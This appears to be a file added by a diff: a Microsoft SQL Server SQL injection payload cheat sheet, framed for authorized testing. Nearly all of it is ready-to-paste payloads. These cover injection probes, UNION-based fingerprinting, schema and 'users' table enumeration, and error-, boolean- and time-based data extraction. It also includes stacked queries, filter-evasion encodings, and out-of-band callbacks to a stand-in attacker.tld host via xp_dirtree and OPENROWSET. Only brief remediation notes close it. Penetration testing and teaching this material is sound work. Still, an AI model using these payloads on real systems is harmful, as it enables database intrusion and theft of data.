@@ -1,0 +1,199 @@
+---
+Vulnerability: SQLi
+Category: Payload
+DB: MSSQL
+---
+# Microsoft SQL Server — SQLi Payloads
+
+> Copy‑paste ready snippets for **authorized** testing on SQL Server (2008–2022). Adjust quoting, column counts, and comments to fit the target. Prefer minimal, non‑destructive proofs.
+
+==============================
+0) Conventions
+==============================
+- Trailing comments: `--` or `/* */` (there is **no** `#` comment in T‑SQL).
+- Statement separator: `;` (many drivers accept multi‑statements; some frameworks sanitize).
+- Placeholders:
+  - `<C>` = number of columns in the original SELECT.
+  - `<P>` = index of a printable (reflected) column.
+  - `<marker>` = unique token (e.g., `q9xZ2025`).
+- Normalize types with `CAST(... AS NVARCHAR(4000))` to avoid type mismatch.
+
+==============================
+1) Injection Sanity Checks
+==============================
+String context probes
+```
+'
+'--
+')--
+```
+Numeric context probes
+```
++1
+-1
+1/0   -- proves error surface if executed verbatim
+```
+
+==============================
+2) Boolean Toggles (Blind baseline)
+==============================
+```
+' AND 1=1--
+' AND 1=2--
+```
+
+==============================
+3) Column Count Discovery (Union path)
+==============================
+`ORDER BY` method (increase until error)
+```
+' ORDER BY 5--
+```
+NULL padding method
+```
+' UNION ALL SELECT NULL--
+' UNION ALL SELECT NULL,NULL--
+' UNION ALL SELECT NULL,NULL,NULL--
+```
+
+==============================
+4) Find a Printable Column
+==============================
+(Example assumes 3 columns; move the marker across positions)
+```
+' UNION ALL SELECT 1,2,3--
+' UNION ALL SELECT 1,'<marker>',3--
+' UNION ALL SELECT '<marker>',2,3--
+' UNION ALL SELECT 1,2,'<marker>'--
+```
+
+==============================
+5) Fingerprint & Basics (Union)
+==============================
+(Assume 3 columns, 2nd is printable; wrap values with NVARCHAR when needed)
+```
+' UNION ALL SELECT 1,@@version,3--
+' UNION ALL SELECT 1,DB_NAME(),3--
+' UNION ALL SELECT 1,SYSTEM_USER,3--
+-- Type‑safe variants
+' UNION ALL SELECT 1,CAST(DB_NAME() AS NVARCHAR(4000)),3--
+```
+
+==============================
+6) Schema Enumeration (Union)
+==============================
+```
+' UNION ALL SELECT 1,table_name,3 FROM information_schema.tables--
+' UNION ALL SELECT 1,column_name,3 FROM information_schema.columns WHERE table_name='users'--
+-- sys.* (richer)
+' UNION ALL SELECT 1,s.name+':'+t.name,3 FROM sys.tables t JOIN sys.schemas s ON t.schema_id=s.schema_id--
+' UNION ALL SELECT 1,c.name,3 FROM sys.columns c WHERE c.object_id=OBJECT_ID(''dbo.users'')--
+```
+
+==============================
+7) Error‑based (conversion echoes data)
+==============================
+```
+' AND CAST((SELECT DB_NAME()) AS INT)--
+' AND CONVERT(INT,(SELECT TOP 1 name FROM sys.tables ORDER BY name))--
+' AND CAST((SELECT TOP 1 name FROM sys.columns WHERE object_id=OBJECT_ID(''dbo.users'')) AS INT)--
+```
+
+==============================
+8) Boolean‑based Extraction
+==============================
+```
+' AND DB_NAME()='appdb'--
+' AND (SELECT COUNT(*) FROM sys.tables)>10--
+' AND ASCII(SUBSTRING((SELECT SYSTEM_USER),1,1))>77--
+```
+
+==============================
+9) Time‑based Extraction
+==============================
+```
+'; WAITFOR DELAY '0:0:3';--
+'; IF (DB_NAME()='appdb') WAITFOR DELAY '0:0:3';--
+'; IF (ASCII(SUBSTRING((SELECT SYSTEM_USER),1,1))>77) WAITFOR DELAY '0:0:3';--
+-- Alternative (less precise):
+'; WAITFOR TIME '23:59:59';--
+```
+
+==============================
+10) Stacked Queries (multi‑statement)
+==============================
+> Works when the driver/framework permits multi‑statements.
+```
+'; SELECT 1;--
+'; DECLARE @x sysname=DB_NAME(); EXEC('SELECT '''+@x+'''');--
+```
+
+==============================
+11) Clause‑Targeted Payloads
+==============================
+`ORDER BY` (identifier injection — fix by allowlisting)
+```
+' ORDER BY 1--
+' ORDER BY 1,2--
+' ORDER BY CASE WHEN DB_NAME()='appdb' THEN 1 ELSE 2 END--
+```
+Pagination / Row iteration (2012+)
+```
+' ORDER BY 1 OFFSET 0 ROWS FETCH NEXT 1 ROWS ONLY--
+```
+
+==============================
+12) Out‑of‑Band (OOB) Callbacks
+==============================
+> Use only with explicit permission. Often works without xp_cmdshell.
+```
+' EXEC master..xp_dirtree '\\\\attacker.tld\\a'--
+' EXEC master..xp_fileexist '\\\\attacker.tld\\a'--
+' SELECT * FROM OPENROWSET(BULK '\\\\attacker.tld\\a', SINGLE_BLOB) AS x--
+```
+
+==============================
+13) No‑quotes Builders (evade filters)
+==============================
+```
+' UNION ALL SELECT 1,CHAR(113,57,120,90),3--          -- "q9xZ"
+' UNION ALL SELECT 1,CHAR(0x71,0x39,0x78,0x5A),3--   -- hex values
+```
+
+==============================
+14) Evasion & Splitting
+==============================
+```
+WaItFoR DEL/**/AY '0:0:3'
+CON/**/VERT(INT, (...))
+```
+
+==============================
+15) Safe Proof Patterns (minimal impact)
+==============================
+```
+-- Boolean flip
+' AND 1=1--
+' AND 1=2--
+
+-- Short time blip
+'; WAITFOR DELAY '0:0:2';--
+
+-- Marker echo (Union)
+' UNION ALL SELECT 1,'<marker>',3--
+```
+
+==============================
+16) Quick Triage Checklist
+==============================
+- [ ] Context identified (string vs numeric); comment style stabilized
+- [ ] Column count matched; printable column located
+- [ ] DB fingerprinted (version, DB_NAME, SYSTEM_USER)
+- [ ] Proof via boolean/time established
+- [ ] Enumeration limited to necessity; **no bulk dumps**
+
+==============================
+17) Cleanup Reminders
+==============================
+- Revert any changes (temp tables, settings) if you created side‑effects.
+- Hand over fixes: **parameterized queries**, least‑privilege account, identifier allowlists, disable risky procs (`xp_cmdshell`, `Ad Hoc Distributed Queries`).
